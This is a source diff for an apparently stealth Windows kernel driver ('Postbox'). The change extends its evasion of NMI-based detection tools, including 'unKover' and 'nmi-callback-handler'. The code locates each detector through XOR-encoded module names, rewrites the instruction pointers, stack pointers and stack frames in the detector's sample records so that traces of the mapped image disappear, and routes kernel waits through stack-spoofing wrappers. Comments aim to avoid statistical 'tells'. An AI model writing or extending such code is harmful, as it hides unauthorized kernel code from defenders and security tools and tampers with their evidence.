@@ -260,7 +260,7 @@ struct PostboxNmiSanitizeState
     uint32_t MonitorActive;
 #endif
     uint32_t Active;
-    uint32_t Reserved;
+    uint32_t DetectorKind;   // 1 = nmi-callback-handler, 2 = unKover
     // N-10: the sanitizer can be ready but inactive when the detector is not
     // loaded yet. The PASSIVE work routine retries activation and refreshes the
     // detector range; RefreshTick paces the module-list walk.
@@ -403,13 +403,14 @@ PostboxMemCaches* PostboxGetMemCaches()
 // Defined with the stack-spoof assembly and globals below; forward-declared for
 // the APC-stackwalk thread loop setup.
 extern "C" uint64_t g_PostboxPopRspRet;
+extern "C" uint64_t g_PostboxPopRspRetSkip;
 extern "C" void PostboxThreadLoop();
 #endif
 
 // Defined with the other call-site wrappers below; declared here because the
 // test-only NMI probe runs before their definitions.
 static void PostboxFreePool(void* Base);
-static int32_t PostboxDelayExecutionThread(int32_t Alertable, uint8_t WaitMode,
+static int32_t PostboxDelayExecutionThread(uint8_t WaitMode, int32_t Alertable,
                                            _LARGE_INTEGER* Interval);
 
 constexpr uint32_t StageBytes = PostboxDataMax;
@@ -994,27 +995,38 @@ struct PostboxNmiSection
 // stem is encoded so the plaintext module name does not appear in .rdata.
 static constexpr EncodedName EncodedDetectorStem = EncodeName("nmicallbackhandler");
 static constexpr uint32_t DetectorStemLen = sizeof("nmicallbackhandler") - 1;
+static constexpr EncodedName EncodedDetectorStemUnkover = EncodeName("unkover");
+static constexpr uint32_t UnkoverStemLen = sizeof("unkover") - 1;
 
-static bool PostboxNmiNameIsDetector(const _UNICODE_STRING& Name)
+static bool PostboxNmiNameMatches(const _UNICODE_STRING& Name,
+                                  const EncodedName& Stem, uint32_t StemLen)
 {
     if (!Name.Buffer || (Name.Length & 1)) return false;
     size_t T = 0;
-    for (size_t i = 0; i < Name.Length / sizeof(wchar_t) && T < DetectorStemLen; ++i)
+    for (size_t i = 0; i < Name.Length / sizeof(wchar_t) && T < StemLen; ++i)
     {
         wchar_t C = Name.Buffer[i];
         if (C >= L'A' && C <= L'Z') C += 32;
         if (C == L'-' || C == L'_' || C == L'.') continue;
-        const char Expected = (char) ((unsigned char) EncodedDetectorStem.Bytes[T] ^ SEED);
+        const char Expected = (char) ((unsigned char) Stem.Bytes[T] ^ SEED);
         if (C != (wchar_t) Expected) return false;
         ++T;
     }
-    return T == DetectorStemLen;
+    return T == StemLen;
+}
+
+static uint32_t PostboxNmiDetectorKindForName(const _UNICODE_STRING& Name)
+{
+    if (PostboxNmiNameMatches(Name, EncodedDetectorStem, DetectorStemLen)) return 1;
+    if (PostboxNmiNameMatches(Name, EncodedDetectorStemUnkover, UnkoverStemLen)) return 2;
+    return 0;
 }
 
 static void PostboxNmiFindDetector(PostboxState* S)
 {
     S->NmiSanitize.DetectorBase = 0;
     S->NmiSanitize.DetectorSize = 0;
+    S->NmiSanitize.DetectorKind = 0;
     const uint64_t Head = S->Caches.PsLoadedModuleList;
     if (!Head) return;
     auto* List = (_LIST_ENTRY*) (uintptr_t) Head;
@@ -1023,10 +1035,12 @@ static void PostboxNmiFindDetector(PostboxState* S)
     {
         if ((uint64_t) (uintptr_t) Link < 0xFFFF800000000000ull) break;
         auto* Entry = CONTAINING_RECORD(Link, _KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-        if (PostboxNmiNameIsDetector(Entry->BaseDllName))
+        const uint32_t Kind = PostboxNmiDetectorKindForName(Entry->BaseDllName);
+        if (Kind)
         {
             S->NmiSanitize.DetectorBase = (uint64_t) (uintptr_t) Entry->DllBase;
             S->NmiSanitize.DetectorSize = Entry->SizeOfImage;
+            S->NmiSanitize.DetectorKind = Kind;
             return;
         }
         Link = Link->Flink;
@@ -1077,6 +1091,30 @@ static bool PostboxNmiContextLooksLikeDetector(PostboxState* S, uint64_t Ctx,
     const uint64_t NtBase = S->NmiSanitize.NtBase;
     const uint64_t NtSize = S->NmiSanitize.NtSize;
     if (NtSize && Ctx >= NtBase && Ctx < NtBase + NtSize) return false;
+
+    if (S->NmiSanitize.DetectorKind == 2)
+    {
+        // unKOver NMI_CONTEXT: threadId(+0), numFired(+4), framesCaptured(+8),
+        // interruptedRip(+0x10), interruptedRsp(+0x18), stackFrames(+0x20).
+        const uint64_t Rec = Ctx + (uint64_t) Core * 0x120ull;
+        if (Rec < Ctx) return false;
+        const uint8_t* Nmi = (const uint8_t*) (uintptr_t) Rec;
+        const uint32_t NumFired = *(const uint32_t*) (Nmi + 4);
+        const uint16_t Frames = *(const uint16_t*) (Nmi + 8);
+        const uint64_t NmiRip = *(const uint64_t*) (Nmi + 0x10);
+        const uint64_t NmiRsp = *(const uint64_t*) (Nmi + 0x18);
+        if (NumFired > 0x100000) return false;
+        if (Frames > 32) return false;
+        if (NmiRip && NmiRip < 0xFFFF800000000000ull) return false;
+        if (NmiRsp && NmiRsp < 0xFFFF800000000000ull) return false;
+        for (uint32_t i = 0; i < Frames; ++i)
+        {
+            const uint64_t Frame = *(const uint64_t*) (Nmi + 0x20 + i * 8);
+            if (Frame && Frame < 0xFFFF800000000000ull) return false;
+        }
+        return true;
+    }
+
     const uint64_t Offset = (uint64_t) Core * sizeof(PostboxDetectorNmiContext);
     const uint64_t Rec = Ctx + Offset;
     if (Rec < Ctx) return false;
@@ -1110,17 +1148,32 @@ static bool PostboxNmiFindDetectorByCallback(PostboxState* S)
         const uint64_t Ctx = *(uint64_t*) (uintptr_t) (Entry + 0x10);
         if (Fn && Ctx && Fn != (uint64_t) (uintptr_t) &PostboxNmiSanitizeEntry &&
             !(ImageSize && Fn >= ImageBase && Fn < ImageBase + ImageSize) &&
-            !(NtSize && Fn >= NtBase && Fn < NtBase + NtSize) &&
-            PostboxNmiContextLooksLikeDetector(S, Ctx, 0))
+            !(NtSize && Fn >= NtBase && Fn < NtBase + NtSize))
         {
-            uint64_t Base = 0;
-            uint64_t Size = 0;
-            if (PostboxNmiModuleForAddress(S, Fn, &Base, &Size))
+            uint32_t Kind = 0;
+            S->NmiSanitize.DetectorKind = 1;
+            if (PostboxNmiContextLooksLikeDetector(S, Ctx, 0))
+                Kind = 1;
+            else
             {
-                S->NmiSanitize.DetectorBase = Base;
-                S->NmiSanitize.DetectorSize = Size;
-                return true;
+                S->NmiSanitize.DetectorKind = 2;
+                if (PostboxNmiContextLooksLikeDetector(S, Ctx, 0))
+                    Kind = 2;
             }
+
+            if (Kind)
+            {
+                uint64_t Base = 0;
+                uint64_t Size = 0;
+                if (PostboxNmiModuleForAddress(S, Fn, &Base, &Size))
+                {
+                    S->NmiSanitize.DetectorBase = Base;
+                    S->NmiSanitize.DetectorSize = Size;
+                    S->NmiSanitize.DetectorKind = Kind;
+                    return true;
+                }
+            }
+            S->NmiSanitize.DetectorKind = 0;
         }
         Entry = Next;
     }
@@ -1348,30 +1401,79 @@ extern "C" uint8_t PostboxNmiSanitizeCallback(void* Context, uint8_t Handled,
         const uint64_t Ctx = *(uint64_t*) (uintptr_t) (Entry + 0x10);
         if (CallbackFn >= DetectorBase && CallbackFn < DetectorEnd && Ctx)
         {
-            // Only touch the record when the hardware frame was actually in the
-            // mapped image. A real nt sample is already plausible; rewriting it
-            // would make every record identical (time-series tell).
-            if (Mapped)
+            // N-11: validate the context layout before touching the detector's
+            // record. A changed/foreign context must not be corrupted.
+            if (!PostboxNmiContextLooksLikeDetector(S, Ctx, Core)) return 1;
+
+            // This sanitizer can run twice per NMI: the newest entry runs before
+            // the detector and rewrites the trap frame; the oldest entry runs
+            // after the detector has stored its sample. The frame rewrite makes
+            // the second pass see Mapped == false, so the record must be scanned
+            // unconditionally. Only mapped values are replaced, which keeps a
+            // real nt sample untouched (no all-identical time-series tell).
+            const uint64_t ImageEnd =
+                S->NmiSanitize.ImageBase + S->NmiSanitize.ImageSize;
+            bool Wrote = false;
+            if (S->NmiSanitize.DetectorKind == 2)
             {
-                // N-11: validate the context layout and the values written before
-                // touching the detector's record. A changed/foreign context must
-                // not be corrupted.
-                if (!PostboxNmiContextLooksLikeDetector(S, Ctx, Core)) return 1;
-                if (EntryRsp < 0xFFFF800000000000ull) return 1;
-                if (RetAddr && RetAddr < 0xFFFF800000000000ull) return 1;
+                // unKOver NMI_CONTEXT: rewrite interrupted RIP/RSP and any mapped
+                // stack frames, but preserve threadId/numFired/frames.
+                auto* Base = (uint8_t*) (uintptr_t) Ctx + (uint64_t) Core * 0x120ull;
+                auto* NmiRip = (uint64_t*) (Base + 0x10);
+                auto* NmiRsp = (uint64_t*) (Base + 0x18);
+                if (*NmiRip >= S->NmiSanitize.ImageBase && *NmiRip < ImageEnd)
+                {
+                    *NmiRip = RetAddr ? RetAddr : S->NmiSanitize.NtBase;
+                    Wrote = true;
+                }
+                if (Mapped && EntryRsp >= 0xFFFF800000000000ull)
+                    *NmiRsp = EntryRsp;
+                uint16_t Frames = *(uint16_t*) (Base + 8);
+                if (Frames > 32) Frames = 32;
+                for (uint32_t f = 0; f < Frames; ++f)
+                {
+                    auto* Slot = (uint64_t*) (Base + 0x20 + f * 8);
+                    if (*Slot >= S->NmiSanitize.ImageBase && *Slot < ImageEnd)
+                    {
+                        *Slot = S->NmiSanitize.NtBase;
+                        Wrote = true;
+                    }
+                }
+#ifdef NMI_PROBE
+                if (Wrote)
+                {
+                    S->NmiSanitize.Writes++;
+                    S->NmiSanitize.LastCount = *(uint32_t*) (Base + 4);
+                    S->NmiSanitize.LastUser = 0;
+                    S->NmiSanitize.LastCore = Core;
+                    S->NmiSanitize.LastRip = *NmiRip;
+                    S->NmiSanitize.LastRsp = *NmiRsp;
+                }
+#endif
+            }
+            else
+            {
                 auto* Nmi = (PostboxDetectorNmiContext*) (uintptr_t) Ctx;
-                Nmi[Core].Rip = RetAddr ? RetAddr : S->NmiSanitize.NtBase;
-                Nmi[Core].Rsp = EntryRsp;
+                if (Nmi[Core].Rip >= S->NmiSanitize.ImageBase && Nmi[Core].Rip < ImageEnd)
+                {
+                    Nmi[Core].Rip = RetAddr ? RetAddr : S->NmiSanitize.NtBase;
+                    Wrote = true;
+                }
+                if (Mapped && EntryRsp >= 0xFFFF800000000000ull)
+                    Nmi[Core].Rsp = EntryRsp;
                 // N-12: preserve the detector's real sample count and user flag.
                 // Forcing 1/0 on every record is a time-series tell.
-                if (Nmi[Core].Count < 1) Nmi[Core].Count = 1;
+                if (Wrote && Nmi[Core].Count < 1) Nmi[Core].Count = 1;
 #ifdef NMI_PROBE
-                S->NmiSanitize.Writes++;
-                S->NmiSanitize.LastCount = Nmi[Core].Count;
-                S->NmiSanitize.LastUser = Nmi[Core].User;
-                S->NmiSanitize.LastCore = Core;
-                S->NmiSanitize.LastRip = Nmi[Core].Rip;
-                S->NmiSanitize.LastRsp = Nmi[Core].Rsp;
+                if (Wrote)
+                {
+                    S->NmiSanitize.Writes++;
+                    S->NmiSanitize.LastCount = Nmi[Core].Count;
+                    S->NmiSanitize.LastUser = Nmi[Core].User;
+                    S->NmiSanitize.LastCore = Core;
+                    S->NmiSanitize.LastRip = Nmi[Core].Rip;
+                    S->NmiSanitize.LastRsp = Nmi[Core].Rsp;
+                }
 #endif
             }
             return 1;
@@ -1494,7 +1596,8 @@ static void PostboxNmiMonitorThread(void* Context)
 static bool PostboxInitThreadLoop(PostboxThreadLoopContext* C, PostboxState* S,
                                   uint64_t Step, int64_t Interval)
 {
-    if (!C || !S || !Step || !g_PostboxPopRspRet) return false;
+    if (!C || !S || !Step || !g_PostboxPopRspRet || !g_PostboxPopRspRetSkip)
+        return false;
     if (!S->Imports.KeDelayExecutionThread || !S->Imports.KeEnterCriticalRegion ||
         !S->Imports.KeLeaveCriticalRegion)
         return false;
@@ -2135,15 +2238,32 @@ static int32_t PostboxMmCopyVirtualMemorySpoof(
 // Spoofed wrappers for the worker/DPC/reaper calls. In a non-STACK_SPOOF build
 // these are direct calls; in the test build the target sees an nt gadget as its
 // return address, so a stack walk inside the API has no mapped return address.
-static int32_t PostboxDelayExecutionThread(int32_t Alertable, uint8_t WaitMode,
+static int32_t PostboxDelayExecutionThread(uint8_t WaitMode, int32_t Alertable,
                                            _LARGE_INTEGER* Interval)
 {
 #ifdef STACK_SPOOF
     if (g_PostboxApiShadow && g_KeDelayExecutionThread)
         return PostboxSpoofInvoke<int32_t>((uint64_t) g_KeDelayExecutionThread,
-                                           Alertable, WaitMode, Interval);
+                                           WaitMode, Alertable, Interval);
 #endif
-    return ((FnKeDelayExecutionThread) g_KeDelayExecutionThread)(Alertable, WaitMode, Interval);
+    return ((FnKeDelayExecutionThread) g_KeDelayExecutionThread)(WaitMode, Alertable, Interval);
+}
+
+// Deliver any pending kernel APCs before the monitor/refresh thread returns.
+// A thread exiting with KernelApcPending set bugchecks 0x20.
+extern "C" void PostboxDrainThreadApcs(void)
+{
+    _LARGE_INTEGER zero = {};
+    PostboxDelayExecutionThread(0, 1, &zero);
+}
+
+// Called from PostboxThreadLoop. This uses the same generic shadow-stack
+// trampoline as the worker/DPC calls instead of the separate clean-wait fake
+// stack, whose return chain was not shadow-space safe.
+extern "C" int32_t PostboxSpoofedThreadWait(int64_t* Interval)
+{
+    if (!Interval) return -1;
+    return PostboxDelayExecutionThread(0, 0, (_LARGE_INTEGER*) Interval);
 }
 
 static uint32_t PostboxSetCoalescableTimer(PostboxTimer* Timer, _LARGE_INTEGER Due,
